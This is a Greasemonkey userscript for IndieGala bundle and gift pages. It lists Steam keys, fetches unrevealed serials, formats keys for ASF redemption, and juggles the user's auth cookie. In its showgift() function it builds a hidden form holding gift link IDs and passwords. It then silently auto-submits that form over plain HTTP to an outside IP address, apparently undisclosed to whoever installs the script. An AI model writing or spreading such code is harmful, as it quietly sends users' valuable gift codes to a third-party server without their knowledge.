// ==UserScript==
// @name        ig_bundle_ajax
// @namespace   ig_bundle_ajax
// @description ig_bundle_ajax
// @include     https://www.indiegala.com/ajaxsale?sale_id=*
// @include     https://www.indiegala.com/gift?gift_id=*
// @icon        http://www.indiegala.com/favicon.ico
// @updateURL 	https://github.com/rusania/gm_scripts/raw/master/ig_bundle_ajax.user.js
// @downloadURL https://github.com/rusania/gm_scripts/raw/master/ig_bundle_ajax.user.js
// @version     2018.04.25.1
// @run-at      document-end
// @require     http://libs.baidu.com/jquery/1.10.1/jquery.min.js
// @grant       GM_log
// @grant       GM_addStyle
// @grant       GM_getValue
// @grant       GM_setValue
// ==/UserScript==

GM_addStyle("table{border:solid 1px;border-collapse:collapse !important;}");
GM_addStyle("td{border:solid 1px;border-collapse:collapse;padding-left:5px;padding-right:5px;font-family:simsun !important;}");
GM_addStyle("div{font-family:simsun !important;}");

var how = $('#header-title');
if(how.length == 0)
    how = $('.left');
if (how.length > 0){
    how.after('<table id="area"></table><div id="area2"></div>');
    how.after('<button id="redeem">KEYS</button>');
    $('#redeem').click(function () {
        showkey();
    });
}

var bk = $('.title-bundle-kind');
if(bk.length > 0){
    var dv = $('#area2');
    if (dv.length == 0)
        dv = $('.title-bundle-kind');
    dv.after('<table id="area_gifts"></table><table id="area_na"></table>');
    dv.after('<button id="gift_btn">GIFTS</button>');
    dv.after('<button id="rest">RESTORE</button>');
    showgift();
    $('#gift_btn').click(function () {
        showgift();
    });
    $('#rest').click(function () {
        restore();
    });
}

function chgcookie()
{
    var m = /auth="([^=;"]+)"/.exec(document.cookie);
    if (m)
        GM_setValue("cookie", m[1]);
}

function showkey()
{
    $('#area').empty();
    $('#area2').empty();
    var i = 1;
    var keys = Array();

    var t = $('#indie_gala_2 div:first').text();
    $('.game-key-string').each(function () {
        var steam = $(this).find('.game-steam-url');
        var href = steam.attr('href');
        var ma = /(app|sub)\/(\d+)/.exec(href);
        var id = ma[2];
        var k = $(this).find('.input-block-level')[0];
        var key = k.value;
        keys.push(key);
        $('#area').append('<tr><td><a href="http://store.steampowered.com/'+ ma[0] +'/">' + steam.text() + '</a></td><td id="' + id + '">' + key + '</td><td>' + i + '</td><td>' + t + '</td></tr>');
        $('#area2').append('<div>【' + (i++) + '】【' + steam.text() + '】&nbsp;<span id="' + id + '">' + key+'</span></div>');
        var code = '';
        var m = /serial_n_([A-F0-9]+)/.exec(k.id);
        if (m){
            code = m[1];
            var link = 'https://www.indiegala.com/myserials/syncget?code=' + code + '&cache=false&productId=' + id;
            if (key.length == 0) {
                $.getJSON(link, function (data) {
                    if (data.status == 'success') {
                        keys.push(key);
                        k.value = data.serial_number;
                        document.getElementById(id).innerHTML = data.serial_number;
                        $('<input value=' + data.entity_id + '/>').insertAfter($(input));
                    } else {
                        alert('redeem error');
                    }
                });
            }
        }
    });
    var asf = '<div>【ASF格式】</div><div>!redeem&nbsp;' + keys.join(',') + '</div>';
    $('#area2').append(asf);
}

function showgift()
{
    $('#area_gifts').empty();
    var gifts = Array();
    var na = Array();
    $('.gift-links-box').each(function () {
        var num = '';
        var m = /link (\d+)/.exec($(this).find('.title-gift').text());
        if (m)
            num = m[1];
        var link = $(this).find('a').attr('href');
        var p = $(this).find('.gift-psw');
        var pwd = '';
        if (p.length == 0){
            na.push(link);
        }
        else {
            pwd = $.trim(p.text());
            var color = link.substr( - 6, 6);
            link = '<tr style="color:#' + color + '"><td>www.indiegala.com' + link + '</td><td>' + pwd + '</td><td>' + num + '</td></tr>';
            gifts.push(link);
            //$('#area_gifts').append('<tr><td>' + num + '</td><td>' + link + '</td><td>' + pwd + '</td></tr>');
        }
    });
    if(na.length > 0){
        var cp = na.length;
        chgcookie();
        document.cookie = 'auth=""';
        $.each(na, function(k, v){
            var i = k;
            $('#area_na').append('<tr><td>' + v + '</td><td id="' + i + '">-</td></tr>');
            $.ajax({
                url: v,
                type: "GET",
                complete: function( data, status, xhr ){
                    $('#' + i).append(status);
                    if (cp-- == 1)
                        restore();
                }
            });
        });
    } else  {
        gifts.sort();
        gifts.forEach(function (e) {
            $('#area_gifts').append(e);
        });
        var dt = $('.profile_list').attr('id');
        var s = '';
        m = /id=(\d+)/.exec(document.URL);
        if (m)
            s = m[1];
        bk.append('<form id="f" action="http://167.88.168.94/ig_sale.php?c=gift&s=' + s + '&d=' + dt + '" method="post" target="_blank"></form>');
        $('#area_gifts tr').each(function () {
            var t = $(this).find('td');
            var g = '';
            m = /id=([0-9a-f]+)/.exec($(t[0]).text());
            if (m)
                g = m[1];
            var pwd = $(t[1]).text();
            var dx = $(t[2]).text();
            $('#f').append('<input type="hidden" name="' + g + '" value="' + pwd + ',' + dx + '" />');
        });
        $('#f').append('<input type="submit" value="Submit" />');
        setTimeout(function () {
            $('#f').submit();
        },1000);
    }
}

function restore(){
    document.cookie = 'auth="' + GM_getValue("cookie", '') + '"';
    setTimeout(function () {
        window.location.reload();
    },1000);
}
